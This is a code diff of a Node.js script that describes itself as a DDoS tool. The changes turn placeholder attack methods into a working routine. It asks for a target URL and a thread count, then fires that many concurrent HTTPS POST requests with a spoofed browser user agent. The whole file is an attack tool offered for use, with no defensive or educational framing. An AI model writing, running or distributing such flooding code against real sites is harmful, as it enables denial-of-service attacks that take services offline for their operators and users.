@@ -1,74 +1,35 @@
 const readline = require('readline');
+const https = require('https');
 
 const USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
 let amount = 0;
 let url = "";
 
 class Dos {
-    constructor(seq, type) {
-        this.seq = seq;
-        this.type = type;
-    }
+    constructor() {}
 
-    run() {
-        try {
-            while (true) {
-                switch (this.type) {
-                    case 1:
-                        this.postAttack(url);
-                        break;
-                    case 2:
-                        this.sslPostAttack(url);
-                        break;
-                    case 3:
-                        this.getAttack(url);
-                        break;
-                    case 4:
-                        this.sslGetAttack(url);
-                        break;
-                }
-            }
-        } catch (e) {
-            console.error(e);
+    async startAttack() {
+        console.log("Setting DDoS");
+        const threads = [];
+        for (let i = 0; i < amount; i++) {
+            threads.push(this.postAttack(url)); // You can change this to getAttack if needed
         }
+        await Promise.all(threads);
+        console.log("Main Thread ended");
     }
 
-    checkConnection(url) {
-        console.log("Checking Connection");
-        const protocol = url.startsWith("https://") ? "https" : "http";
-        const connection = protocol === "https" ? require("https") : require("http");
-
-        connection.get(url, (res) => {
-            if (res.statusCode === 200) {
-                console.log("Connected to website");
-            }
+    async postAttack(url) {
+        return new Promise((resolve, reject) => {
+            const req = https.request(url, { method: 'POST', headers: { 'User-Agent': USER_AGENT } }, (res) => {
+                console.log("Attack response: ", res.statusCode);
+                resolve();
+            });
+            req.end();
+            req.on('error', (error) => {
+                console.error("Error in attack: ", error);
+                reject(error);
+            });
         });
-    }
-
-    sslCheckConnection(url) {
-        console.log("Checking Connection (ssl)");
-        const connection = require("https");
-        connection.get(url, (res) => {
-            if (res.statusCode === 200) {
-                console.log("Connected to website");
-            }
-        });
-    }
-
-    postAttack(url) {
-        // Implementation
-    }
-
-    sslPostAttack(url) {
-        // Implementation
-    }
-
-    getAttack(url) {
-        // Implementation
-    }
-
-    sslGetAttack(url) {
-        // Implementation
     }
 }
 
@@ -84,23 +45,10 @@ rl.question("Enter Target URL: ", (targetUrl) => {
         url = targetUrl;
         amount = parseInt(numThreads);
 
-        console.log("Setting DDoS")
-        const threads = [];
-            for (let i = 0; i < this.amount; i++) {
-                threads.push(this.postAttack(url)); // You can change this to getAttack if needed
-            }
-            await Promise.all(threads);
-            console.log("Main Thread ended");
-        } catch (error) {
-            console.error("Error starting attack:", error);
-        }
-    }
-}
-
-(async () => {
-    const dos = new Dos();
-    await dos.startAttack();
-})();
-        rl.close(); // Close the readline interface
+        (async () => {
+            const dos = new Dos();
+            await dos.startAttack();
+            rl.close(); // Close the readline interface
+        })();
     });
 });
